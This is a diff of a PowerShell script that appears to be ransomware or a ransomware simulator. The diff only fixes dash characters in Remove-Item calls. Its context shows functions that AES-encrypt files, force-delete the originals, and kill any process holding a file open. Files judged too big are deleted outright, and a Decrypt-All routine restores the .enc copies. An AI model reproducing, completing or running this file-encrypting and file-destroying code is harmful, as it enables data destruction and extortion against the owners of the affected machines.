@@ -61,7 +61,7 @@ function Not-Too-Big ($file, $key, $aesManaged, $encryptor){
     catch{
         try{
             $encryptedcontent = Encrypt-String $key $file $aesManaged $encryptor;
-            Remove-Item –path $file -force;
+            Remove-Item -Path $file -force;
             Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}};
             Set-Content -Path $file'.enc' -Value $encryptedcontent;
             }
@@ -74,12 +74,12 @@ function Not-Too-Big ($file, $key, $aesManaged, $encryptor){
 
 function Too-Big($file, $key){
     try{
-        Remove-Item –path $file -force
+        Remove-Item -Path $file -force
     }
     catch{
         try{
             Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}};
-            Remove-Item –path $file -force
+            Remove-Item -Path $file -force
         }
         catch{}
     }
@@ -111,7 +111,7 @@ function Decrypt-All($key){
          $decryptedcontent = Decrypt-String $key $content;
          $file = $file -replace ".{4}$";
          Set-Content -Path $file -Value $decryptedcontent;
-         Remove-Item –path $file'.enc'
+         Remove-Item -Path $file'.enc'
     }
 }
 
